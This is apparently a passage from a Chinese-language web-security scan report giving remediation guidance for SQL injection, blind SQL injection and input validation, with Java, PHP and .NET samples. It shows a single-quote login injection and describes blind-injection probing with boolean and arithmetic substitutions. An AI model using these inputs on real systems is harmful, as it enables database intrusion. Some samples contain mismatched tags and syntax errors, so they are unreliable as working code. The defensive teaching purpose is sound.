  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  
  ...
</div><div></div><div>定義多重資源可以支援不同的語言環境（因此稱為資源組）。例如，定義 ErrorMessages_fr.properties 可以支援資源組系列的法國成員。如果要求之語言環境的資源成員不存在，便會使用預設成員。在上述範例中，預設資源是 ErrorMessages.properties。依使用者的語言環境而定，應用程式（JSP 或 Servlet）會從適當的資源擷取內容。</div><div></div><div>[3-b] 訊息格式化</div><div>J2SE 標準類別 java.util.MessageFormat 提供以取代位置保留元來建立訊息的一般方式。MessageFormat 物件包含內嵌了格式指定元的型樣字串，如下所示：</div><div></div><div>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</div><div></div><div>以下是利用 ResourceBundle 和 MessageFormat 來呈現錯誤訊息的更綜合性的範例：</div><div></div><div>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</div><div></div><div>建議您定義自訂 JSP 標籤（如 displayErrors）來疊代處理及呈現錯誤訊息，如上述範例所示。</div><div></div><div>[4] 錯誤對映</div><div>一般而言，「Servlet 儲存器」會傳回對應於回應狀態碼或異常狀況的預設錯誤頁面。您可以利用自訂錯誤頁面來指定狀態碼或異常狀況與 Web 資源之間的對映。</div><div>在實務中，好的做法是開發不揭露內部錯誤狀態的靜態錯誤頁面（依預設，大部分 Servlet 儲存器都會報告內部錯誤訊息）。這項對映是依照下列範例所指定，配置在「Web 部署描述子 (web.xml)」中：</div><div></div><div>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</div><div></div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」是依照上述說明來定義錯誤處理機制的 Java 架構。驗證規則配置在 XML 檔中，檔案定義了表單欄位的輸入驗證規則以及對應的驗證錯誤索引鍵。Struts 提供國際化支援，供您利用資源組和訊息格式化來建置本地化應用程式。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>Struts JSP 標籤庫定義了有條件地顯示一組累計錯誤訊息的 "errors" 標籤，如下列範例所示：</div><div></div><div>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件、驗證輸入，以及支援國際化的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 定義了 "output_errors" UIOutput 展現器，以顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息。</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div>** 過濾使用者輸入</div><div></div><div>將任何資料傳給 SQL 查詢之前，一律應該先利用白名單技術來適當過濾。這無論如何強調都不為過。</div><div>過濾使用者輸入可讓許多注入缺失，在抵達資料庫之前便得到更正。</div><div></div><div>** 引用使用者輸入</div><div></div><div>不論任何資料類型，只要資料庫允許，便用單引號括住所有使用者資料，始終是好的觀念。</div><div>MySQL 接受這個格式化技術。</div><div></div><div>** 跳出資料值</div><div></div><div>如果您使用 MySQL 4.3.0 或更新的版本，您應該用 mysql_real_escape_string() 來跳出所有字串。</div><div>如果使用舊版的 MySQL，便應該使用 mysql_escape_string() 函數。</div><div>如果未使用 MySQL，您可以選擇使用特定資料庫的特定跳出函數。</div><div>如果不知道跳出函數，您可以選擇使用較一般的跳出函數，例如，addslashes()。</div><div></div><div>如果使用 PEAR DB 資料庫抽象層，您可以使用 DB::quote() 方法或使用 ? 之類的查詢位置保留元，它會自動跳出取代位置保留元的值。</div><div></div><div>參照</div><a href="http://ca3.php.net/mysql_real_escape_string">http://ca3.php.net/mysql_real_escape_string</a><br /><a href="http://ca.php.net/mysql_escape_string">http://ca.php.net/mysql_escape_string</a><br /><a href="http://ca.php.net/addslashes">http://ca.php.net/addslashes</a><br /><a href="http://pear.php.net/package-info.php?package=DB">http://pear.php.net/package-info.php?package=DB</a><br /><div></div><div></div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但一律必須在伺服器層執行資料驗證。用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是實作一或多個驗證各個應用程式參數的函數。下列各節說明一些檢查範例。</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div>如何驗證必要欄位的範例：</div><div>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</div><div></div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：</div><div>^[a-zA-Z0-9]+$</div><div></div><div>[7] Cookie 值</div><div>依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>[8] HTTP 回應</div><div></div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，開發人員應該將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>PHP 包括一些 htmlentities() 之類的自動化消毒公用程式函數：</div><div></div><div>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</div><div></div><div>此外，為了避免「跨網站指令碼」的 UTF-7 變式，您應該明確定義回應的 Content-Type 標頭，例如：</div><div></div><div>  &lt;?php
  
  header('Content-Type: text/html; charset=UTF-8');
  
  ?&gt;
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div></div><div>當機密資料儲存在 Cookie 中，且透過 SSL 來傳輸它時，請務必先在 HTTP 回應中設定 Cookie 的安全旗標。這會指示瀏覽器只透過 SSL 連線來使用這個 Cookie。</div><div></div><div>您可以利用下列程式碼範例來維護 Cookie 安全：</div><div></div><div>  &lt;$php
  
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
  
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
  
</div><div></div><div>此外，我們建議您使用 HttpOnly 旗標。當 HttpOnly 旗標設為 TRUE 時，只能透過 HTTP 通訊協定來存取 Cookie。這表示無法用 JavaScript 之類的 Scripting 語言存取 Cookie。這個設定有助於實際減少透過 XSS 攻擊來盜用身分的情況（不過，並非所有瀏覽器都支援）。</div><div></div><div>PHP 5.2.0 新增 HttpOnly 旗標。</div><div></div><div>參照</div><div></div><div>[1] 利用「HTTP 專用 Cookie」緩和「跨網站指令碼」： </div><a href="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</a><br /><div>[2] PHP 安全聯盟： </div><a href="http://phpsec.org/">http://phpsec.org/</a><br /><div>[3] PHP &amp; Web 應用程式安全部落格 (Chris Shiflett)： </div><a href="http://shiflett.org/">http://shiflett.org/</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/89.html">89</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/943.html">943</a><br /><a href="http://cwe.mitre.org/data/definitions/74.html">74</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="h2group" id="attBlindSqlInjectionStrings" xmlns=""><h2>盲目的 SQL 注入</h2><a name="attBlindSqlInjectionStrings_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>未正確地消毒使用者所輸入的危險字元</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能檢視、修改或刪除資料庫項目和表格</div><div>軟體會使用受外部影響的輸入來建構所有或部分 SQL 指令，但是在傳送至資料庫時，其無法使可修改 SQL 指令的元素失效。</div><div></div><div>如果未針對可由使用者控制的輸入進行充分移除或加引號，其所產生的 SQL 查詢可能會造成這些輸入被解譯為 SQL 而非一般使用者資料。這可能會被用來改變查詢邏輯以略過安全檢查，或插入其他陳述式以修改後端資料庫，其中可能包括執行系統指令。</div><div>例如，假設有一個 HTML 頁面含有登入表單，最終會使用使用者輸入對資料庫執行下列 SQL 查詢：</div><div>  SELECT * FROM accounts WHERE username='$user' AND password='$pass'
</div><div>$user 和 $pass 這兩個變數包含使用者在登入表單中所輸入的使用者認證。</div><div>如果使用者輸入 "jsmith" 作為使用者名稱，且輸入 "Demo1234" 作為密碼，則 SQL 查詢會看起來如下：</div><div>  SELECT * FROM accounts WHERE username='jsmith' AND password='Demo1234'
</div><div>但是，如果使用者輸入 "'"（一個單引號）作為使用者名稱，且輸入 "'"（一個單引號）作為密碼，則 SQL 查詢會看起來如下：</div><div>  SELECT * FROM accounts WHERE username=''' AND password='''
</div><div>這當然是形態異常的 SQL 查詢，且會呼叫可能在 HTTP 回應中傳回的錯誤訊息。</div><div>這類錯誤會通知攻擊者 SQL 注入已成功，而會引導攻擊者嘗試進一步攻擊手法。</div><div></div><div>「盲目的 SQL 注入」與「SQL 注入」類似。差異在於運用它，攻擊者不需尋找回應中的 SQL 錯誤。因此，AppScan 用來識別它的方法也不同。</div><div>AppScan 不會嘗試呼叫 SQL 錯誤，而是透過多項要求來操作應用程式的邏輯，以找出很容易遭到 SQL 注入攻擊的 Script。</div><div></div><div>這項技術需要傳送有弱點的參數（被內嵌在 SQL 查詢中的參數）已遭修改的要求，使得回應能夠指出是否在 SQL 查詢環境定義中使用資料。</div><div>這項修改包括搭配原始字串來使用 AND 布林表示式，使它一時得出 True 一時得出 False。</div><div>在一個情況中，最後結果應該與原始結果相同（登入成功）；在另一情況中，結果應該明顯不同（登入失敗）。</div><div>在某些少見的情況中，得出 True 的 OR 表示式也很有用。</div><div></div><div>如果原始資料是數值，就可以採用較簡單的技巧。假設原始資料是 123。這項資料可以在某項要求中取代為 0+123，在另一項要求中取代為 456+123。第一項要求的結果應該與原始結果相同，第二項要求的結果應該不同（因為得出的數字是 579）。</div><div>在某些情況中，我們仍需要上面所說明的攻擊版本（使用 AND 和 OR），但並不跳出字串上下文。</div><div></div><div>「盲目的 SQL 注入」背後的概念是，即使未直接收到資料庫的資料（以錯誤訊息或洩漏資訊的形式），也可能擷取資料庫中的資料（每次一個位元），或以惡意方式修改查詢。</div><div>觀念在於，應用程式的行為（傳回的回應與原始回應相同或不同）可以提供關於所評估（已修改）查詢的單一位元資訊，也就是說，攻擊者有可能規劃使用 SQL 布林表示式，並以應用程式行為（相同/不同於原始行為）的形式來侵害其評估（單一位元）。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>以下是幾種減輕風險的技巧：</div><div>[1] 策略：程式庫或架構</div><div>使用檢查過且不容許此弱點的程式庫或架構，或提供使其更容易避免的建構項。</div><div></div><div>[2] 策略：參數化</div><div>如果可行，請使用結構化機制來自動強制分開資料與程式碼。這些機制可能可以自動提供相關的引用、編碼和驗證，而不是在每次產生輸出時，都依賴開發人員來提供。</div><div></div><div>[3] 策略：環境強化 使用完成必要作業所需的最低專用權，來執行程式碼。</div><div></div><div>[4] 策略：輸出編碼</div><div>如果儘管有風險，您還是需要使用動態產生的查詢字串或指令，適當地括住引數且避免在這些引數內使用任何特殊字元。</div><div></div><div>[5] 策略：輸入驗證</div><div>假設所有輸入都是惡意的。請使用「接受已知良好」輸入驗證策略：嚴格符合規格的可接受輸入白名單。拒絕未嚴格符合規格的任何輸入，或將其轉換成嚴格符合規格者。請勿只靠使用黑名單來偵測惡意或形態異常的輸入。不過，在偵測潛在攻擊或判斷哪些輸入因形態異常而應該斷然拒絕時，黑名單就很有用。</div><div>以下是保護 Web 應用程式免於遭受 SQL 注入攻擊的兩種可能方式：</div><div></div><div>[1] 使用儲存程序，而不用動態建置的 SQL 查詢字串。</div><div>參數傳給 SQL Server 儲存程序的方式，會防止使用單引號和連字號。</div><div></div><div>如何在 ASP.NET 中使用儲存程序的範例如下：</div><div></div><div>  ' Visual Basic example
  Dim DS As DataSet
  Dim MyConnection As SqlConnection
  Dim MyCommand As SqlDataAdapter
  
  Dim SelectCommand As String = "select * from users where username = @username"
  ...
  MyCommand.SelectCommand.Parameters.Add(New SqlParameter("@username", SqlDbType.NVarChar, 20))
  MyCommand.SelectCommand.Parameters("@username").Value = UserNameField.Value
  
  
  // C# example
  String selectCmd = "select * from Authors where state = @username";
  SqlConnection myConnection = new SqlConnection("server=...");
  SqlDataAdapter myCommand = new SqlDataAdapter(selectCmd, myConnection);
  
  myCommand.SelectCommand.Parameters.Add(new SqlParameter("@username", SqlDbType.NVarChar, 20));
  myCommand.SelectCommand.Parameters["@username"].Value = UserNameField.Value;
</div><div></div><div>[2] 您可以利用驗證控制項，將輸入驗證新增到「Web 表單」頁面中。驗證控制項提供適用於標準驗證之所有一般類型的簡易使用機制（例如：測試日期是否有效，或值是否在範圍內），以及用來提供自訂編寫驗證的方式。</div><div>此外，驗證控制項也可讓您完整自訂向使用者顯示錯誤資訊的方式。</div><div>驗證控制項可以搭配「Web 表單」頁面類別檔所處理的任何控制項來使用，其中包括 HTML 和 Web 伺服器控制項。</div><div></div><div>如果要確定使用者輸入只包含有效值，您可以使用下列其中一個驗證控制項：</div><div></div><div>a. "RangeValidator"：檢查使用者的輸入（值）是否在指定的上下界限之間。</div><div>您可以檢查數字、英文字母和日期之配對內的範圍。</div><div></div><div>b. "RegularExpressionValidator"：檢查輸入是否符合正規表示式所定義的型樣。</div><div>這類型的驗證可讓您檢查可預期的字元序列，例如：社會保險號碼、電子郵件位址、電話號碼、郵遞區號等等中的字元序列。</div><div></div><div>重要注意事項：驗證控制項不會封鎖使用者輸入，或變更頁面處理流程；它們只會設定錯誤狀態，以及產生錯誤訊息。在執行進一步的應用程式專屬動作之前，程式設計師負責測試程式碼中的控制項狀態。</div><div></div><div>檢查使用者輸入有效性有兩種方式：</div><div></div><div>1. 測試一般錯誤狀態：</div><div></div><div>在您的程式碼中，測試頁面的 IsValid 內容。</div><div>這個內容會累積頁面上所有驗證控制項的 IsValid 內容值（使用邏輯 AND）。如果其中一個驗證控制項設為無效，頁面內容便會傳回 False。</div><div></div><div>2. 測試個別控制項的錯誤狀態：</div><div></div><div>在迴圈中處理頁面的驗證器集合，集合中含有指向所有驗證控制項的參照。</div><div>之後，您便可以檢查每個驗證控制項的 IsValid 內容。</div><div>** 備妥陳述式：</div><div></div><div>保護您的應用程式免於遭受 SQL 注入（亦即，惡意竄改 SQL 參數）有三種可能的方式。</div><div>請利用下列方式，而非動態建置 SQL 陳述式：</div><div></div><div>[1] PreparedStatement，經過前置編譯而存放在 PreparedStatement 物件儲存區中。</div><div>PreparedStatement 定義用來登錄輸入參數的設定元，輸入參數相容於支援的 JDBC SQL 資料類型。</div><div>例如，setString 應該用於 VARCHAR 或 LONGVARCHAR 類型的輸入參數（請參閱 Java API，以取得進一步的詳細資料）。</div><div>這個設定輸入參數的方式，可以防止攻擊者注入不正確的字元（如單引號）來操作 SQL 陳述式。</div><div></div><div>如何使用 J2EE 中之 PreparedStatement 的範例：</div><div></div><div>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareStatement("select * from users where username = ?");
      myStatement.setString(1, userNameField);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</div><div></div><div>[2] CallableStatement，延伸 PreparedStatement 來執行資料庫 SQL 儲存程序。</div><div>這個類別繼承 PreparedStatement 的輸入設定元（請參閱上面的 [1]）。</div><div></div><div>下列範例假設已建立好這個資料庫儲存程序：</div><div></div><div>CREATE PROCEDURE select_user (@username varchar(20))</div><div>AS SELECT * FROM USERS WHERE USERNAME = @username;</div><div></div><div>如何利用 J2EE 中的 CallableStatement 來執行上述儲存程序的範例：</div><div></div><div>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareCall("{?= call select_user ?,?}");
      myStatement.setString(1, userNameField);
      myStatement.registerOutParameter(1, Types.VARCHAR);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</div><div></div><div>[3] Entity Bean，在持續性儲存庫機制中代表 EJB 商業物件。</div><div>Entity Bean 有兩種類型：Bean 管理和儲存器管理。</div><div>當使用 Bean 管理的持續性時，開發人員負責撰寫存取資料庫的 SQL 程式碼（請參閱上述 [1] 和 [2] 區段）。</div><div>當使用儲存器管理的持續性時，EJB 儲存器會自動產生 SQL 程式碼。</div><div>因此，儲存器要負責防止惡意嘗試竄改產生的 SQL 程式碼。</div><div></div><div>如何使用 J2EE 中之 Entity Bean 的範例：</div><div></div><div>  // J2EE EJB Example
  try {
      // lookup the User home interface
      UserHome userHome = (UserHome)context.lookup(User.class);    
      // find the User remote interface
      User = userHome.findByPrimaryKey(new UserKey(userNameField));    
      ...    
  } catch (Exception e) {
      ...
  }
</div><div></div><div>建議的 Java 工具</div><div>N/A</div><div></div><div>參照</div><a href="https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html">https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html</a><br /><a href="https://docs.oracle.com/javase/7/docs/api/java/sql/CallableStatement.html">https://docs.oracle.com/javase/7/docs/api/java/sql/CallableStatement.html</a><br /><div></div><div></div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但必須利用 Servlet，在伺服器層執行資料驗證。</div><div>用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是在 "Validator" 公用程式類別中將上述常式當作靜態方法來實作。下列各節說明範例驗證器類別</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div></div><div>如何驗證必要欄位的範例：</div><div>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div>請利用 Java 基本封套類別來檢查欄位值是否能安全轉換成所需要的基本資料類型。</div><div></div><div>如何驗證數值欄位（int 類型）的範例：</div><div></div><div>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>在實務中，好的做法是將所有 HTTP 要求參數轉換成它們的相關資料類型。例如，開發人員應該將要求參數的 "integerValue" 儲存在要求屬性中，再依照下列範例所示來使用它：</div><div></div><div>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</div><div></div><div>應用程式應該處理的主要 Java 資料類型：</div><div>- Byte</div><div>- Short</div><div>- Integer</div><div>- Long</div><div>- Float</div><div>- Double</div><div>- Date</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>驗證 userName 欄位的長度是否在 8-20 個字元之間的範例：</div><div></div><div>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
